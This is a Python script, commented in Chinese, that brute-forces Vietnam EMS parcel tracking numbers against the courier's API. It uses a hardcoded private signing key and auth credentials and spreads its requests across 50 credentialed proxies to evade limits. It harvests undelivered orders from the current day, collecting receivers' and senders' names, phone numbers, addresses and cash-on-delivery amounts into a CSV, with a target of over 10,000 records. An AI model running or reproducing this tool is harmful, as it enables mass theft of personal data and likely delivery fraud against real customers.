#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
大规模扫描今天的订单 - 目标10000+
扩大扫描范围到所有可能区间
"""
import hashlib, requests, json, time, random, re, sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time(), 'csv_file': None}
TARGET = 10000

# 100个代理池（完整）
PROXIES_STR = """
23.27.184.245:5846:uadkcvtn:uo2rzar814ph
45.43.70.140:6427:uadkcvtn:uo2rzar814ph
82.24.233.117:5439:uadkcvtn:uo2rzar814ph
136.0.188.71:6034:uadkcvtn:uo2rzar814ph
161.123.130.168:5839:uadkcvtn:uo2rzar814ph
142.147.240.52:6574:uadkcvtn:uo2rzar814ph
166.88.224.145:6043:uadkcvtn:uo2rzar814ph
82.25.215.106:5457:uadkcvtn:uo2rzar814ph
91.211.87.215:7205:uadkcvtn:uo2rzar814ph
104.238.36.64:6071:uadkcvtn:uo2rzar814ph
104.239.40.211:6830:uadkcvtn:uo2rzar814ph
67.227.37.26:5568:uadkcvtn:uo2rzar814ph
108.165.218.84:5823:uadkcvtn:uo2rzar814ph
109.196.160.242:5988:uadkcvtn:uo2rzar814ph
104.238.38.204:6472:uadkcvtn:uo2rzar814ph
140.99.203.108:5985:uadkcvtn:uo2rzar814ph
82.25.224.37:7848:uadkcvtn:uo2rzar814ph
216.74.118.50:6205:uadkcvtn:uo2rzar814ph
104.239.13.199:6828:uadkcvtn:uo2rzar814ph
161.123.152.216:6461:uadkcvtn:uo2rzar814ph
185.72.240.218:7254:uadkcvtn:uo2rzar814ph
104.239.43.88:5816:uadkcvtn:uo2rzar814ph
92.113.115.48:5995:uadkcvtn:uo2rzar814ph
145.223.44.64:5747:uadkcvtn:uo2rzar814ph
155.254.34.216:6196:uadkcvtn:uo2rzar814ph
166.88.169.112:6719:uadkcvtn:uo2rzar814ph
82.23.223.60:7904:uadkcvtn:uo2rzar814ph
166.88.235.140:5768:uadkcvtn:uo2rzar814ph
23.129.252.17:6285:uadkcvtn:uo2rzar814ph
46.203.134.90:5714:uadkcvtn:uo2rzar814ph
82.23.227.49:7352:uadkcvtn:uo2rzar814ph
104.239.13.114:6743:uadkcvtn:uo2rzar814ph
50.114.98.129:5613:uadkcvtn:uo2rzar814ph
154.6.83.144:6615:uadkcvtn:uo2rzar814ph
45.38.86.229:6158:uadkcvtn:uo2rzar814ph
64.137.73.19:5107:uadkcvtn:uo2rzar814ph
45.131.101.19:6286:uadkcvtn:uo2rzar814ph
104.239.40.197:6816:uadkcvtn:uo2rzar814ph
82.21.209.226:6555:uadkcvtn:uo2rzar814ph
23.26.71.157:5640:uadkcvtn:uo2rzar814ph
23.27.91.75:6154:uadkcvtn:uo2rzar814ph
23.95.150.72:6041:uadkcvtn:uo2rzar814ph
82.26.218.128:6436:uadkcvtn:uo2rzar814ph
91.223.126.118:6730:uadkcvtn:uo2rzar814ph
145.223.44.177:5860:uadkcvtn:uo2rzar814ph
45.38.94.42:5963:uadkcvtn:uo2rzar814ph
23.26.95.215:5697:uadkcvtn:uo2rzar814ph
50.114.15.8:5993:uadkcvtn:uo2rzar814ph
82.24.217.113:5443:uadkcvtn:uo2rzar814ph
136.0.109.46:6332:uadkcvtn:uo2rzar814ph
"""

def load_proxies():
    global proxies
    for line in PROXIES_STR.strip().split('\n'):
        if line.strip():
            parts = line.strip().split(':')
            if len(parts) == 4:
                ip, port, user, pwd = parts
                proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def check_order(tracking):
    if state['found'] >= TARGET:
        return
    
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            
            if is_today(issue_date):
                r2 = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers, data={"ParcelCode": tracking}, proxies=proxy, timeout=5)
                is_delivered = r2.status_code == 200 and r2.json().get('ListValue')
                
                if not is_delivered:
                    order = {
                        'tracking': tracking, 'issue_date': issue_date,
                        'receiver': v.get('ReceiverName',''), 
                        'phone': v.get('ReceiverPhone','') or extract_phone(v.get('ReceiverName','')),
                        'amount': v.get('CollectAmount',0),
                        'address': v.get('ReceiverAddress',''),
                        'sender': v.get('SenderName',''),
                        'sender_phone': v.get('SenderPhone','')
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        safe_print(f"✅ [{state['found']:,}/{TARGET:,}] {tracking} | 👤{order['receiver'][:15]} | 📞{order['phone']} | 💰{order['amount']:,}₫")
                        
                        if state['found'] % 100 == 0 or state['found'] == 1:
                            save_progress()
    except:
        pass

def save_progress():
    if not state['csv_file']:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        state['csv_file'] = f"today_orders_{timestamp}.csv"
        safe_print(f"\n💾 创建文件: {state['csv_file']}\n")
    
    with open(state['csv_file'], 'w', encoding='utf-8') as f:
        f.write("运单号,发件日期,发件人,发件电话,收件人,收件电话,收件地址,金额\n")
        for o in state['orders']:
            f.write(f'"{o["tracking"]}","{o["issue_date"]}","{o["sender"]}","{o["sender_phone"]}",')
            f.write(f'"{o["receiver"]}","{o["phone"]}","{o["address"]}","{o["amount"]}"\n')
    
    if state['found'] % 100 == 0:
        safe_print(f"💾 已保存 {state['found']:,} 个订单\n")

# 扩大扫描范围！
SCAN_RANGES = [
    ('EP', 493000000, 495000000, 5),    # EP 200万，步长5
    ('EP', 492500000, 493000000, 10),   # EP 老区间
    ('EB', 942000000, 945000000, 10),   # EB 最新
    ('EB', 102800000, 103000000, 20),   # EB 老区间
    ('EC', 149770000, 149800000, 3),    # EC 密集区
    ('EF', 47500000, 48500000, 20),     # EF
    ('ED', 121900000, 122000000, 10),   # ED
    ('EG', 47300000, 47400000, 10),     # EG
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║        🚀 大规模扫描今天订单 - {TODAY} - 目标{TARGET:,}个       ║
╚════════════════════════════════════════════════════════════════════════════╝

策略：扩大扫描范围！
  • EP: 250万个号码（主力）
  • EB: 30万个号码
  • EC/ED/EF/EG: 10万个号码
  • 总计：300万+号码

配置：
  • 50线程并发
  • {len(PROXIES_STR.strip().split(chr(10)))} 个代理池
  • 步长优化

预计：
  • 按1%成功率：300万 × 1% = 30000个
  • 速度：500-1000/秒
  • 耗时：50-100分钟
""")

load_proxies()
print(f"🚀 开始大规模扫描...\n")

with ThreadPoolExecutor(max_workers=50) as executor:
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        safe_print(f"📍 扫描 {prefix}{start}-{end} 步长{step}")
        
        futures = []
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order, tracking))
        
        for future in as_completed(futures):
            if state['found'] >= TARGET:
                break
            try:
                future.result()
                
                if state['tested'] % 5000 == 0:
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed
                    safe_print(f"\n📊 已扫{state['tested']:,} | 找到{state['found']:,} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
            except:
                pass

save_progress()
elapsed = time.time() - state['start_time']
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到今天未签收订单：{state['found']:,} 个
已测试：{state['tested']:,} 个
成功率：{state['found']/state['tested']*100:.2f}%
耗时：{elapsed/60:.1f} 分钟
速度：{state['tested']/elapsed:.0f} 次/秒
文件：{state['csv_file']}
{'='*80}
""")
